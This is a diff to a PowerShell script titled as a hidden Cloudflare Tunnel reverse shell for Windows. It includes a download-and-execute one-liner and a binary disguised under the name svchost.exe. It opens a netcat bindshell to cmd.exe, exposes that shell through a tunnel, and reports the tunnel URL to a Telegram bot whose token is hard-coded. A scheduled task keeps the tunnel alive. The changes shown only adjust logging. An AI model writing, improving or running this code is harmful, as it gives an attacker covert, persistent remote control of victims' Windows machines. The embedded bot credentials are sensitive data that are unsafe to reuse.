@@ -1,5 +1,5 @@
 # Cloudflare Tunnel Reverse Shell for Windows (Hidden)
-# Run directly from PowerShell: IEX (New-Object Net.WebClient).DownloadString('URL')
+# Run: iex (iwr -UseBasicParsing 'URL').Content
 
 $ErrorActionPreference = "Stop"
 
@@ -10,7 +10,7 @@ $tmpDir = "$env:TEMP\.cf-$([System.Environment]::UserName)"
 $binHiddenName = "svchost.exe"
 $port = Get-Random -Minimum 10000 -Maximum 50000
 
-# Telegram
+# Telegram (ganti dengan milik Anda)
 $telegramBotToken = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
 $telegramChatId = "6223261018"
 
@@ -76,7 +76,7 @@ New-Item -ItemType Directory -Force -Path $configDir | Out-Null
 Write-Host "Downloading cloudflared..."
 Invoke-WebRequest -Uri $urlCloudflared -OutFile $cfPath -ErrorAction Stop
 
-# Start bindshell (using PowerShell TCP listener if netcat not available)
+# Start bindshell
 Write-Host "Starting bindshell on port $port ..."
 $bindCmd = if (Get-Command nc -ErrorAction SilentlyContinue) {
     "nc -l -p $port -s 127.0.0.1 -e cmd.exe"
@@ -85,10 +85,11 @@ $bindCmd = if (Get-Command nc -ErrorAction SilentlyContinue) {
 }
 $bindPid = Start-HiddenProcess "cmd.exe" "/c $bindCmd"
 
-# Start tunnel
+# Start tunnel with separate files for stdout and stderr
 Write-Host "Starting Cloudflare tunnel..."
 $tunnelLog = "$tmpDir\cloudflared.log"
-$tunnelProc = Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput $tunnelLog -RedirectStandardError $tunnelLog
+$tunnelErr = "$tmpDir\cloudflared.err"
+$tunnelProc = Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput $tunnelLog -RedirectStandardError $tunnelErr
 $tunnelPid = $tunnelProc.Id
 
 # Save token and config
@@ -103,12 +104,13 @@ PORT=$port
 # Wait for URL and notify
 Write-Host "Waiting for tunnel URL..."
 Start-Sleep -Seconds 5
-$url = Select-String -Path $tunnelLog -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" | Select-Object -First 1 | ForEach-Object { $_.Matches[0].Value }
+# Check both stdout and stderr logs
+$url = Select-String -Path $tunnelLog,$tunnelErr -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" | Select-Object -First 1 | ForEach-Object { $_.Matches[0].Value }
 if ($url) {
     Write-Host "Tunnel URL: $url"
     Send-Telegram "✅ Initial Tunnel URL: $url"
 } else {
-    Write-Host "No URL found yet, check log: $tunnelLog"
+    Write-Host "No URL found yet, check logs: $tunnelLog or $tunnelErr"
 }
 
 # Persistence via Scheduled Task
@@ -119,8 +121,9 @@ $persistScript = "$configDir\cf_tunnel.ps1"
 `$cfPath = "$cfPath"
 `$port = $port
 `$log = "$tmpDir\cloudflared.log"
+`$err = "$tmpDir\cloudflared.err"
 while (`$true) {
-    `$p = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$log -RedirectStandardError `$log
+    `$p = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$log -RedirectStandardError `$err
     `$p.WaitForExit()
     Start-Sleep -Seconds 10
 }
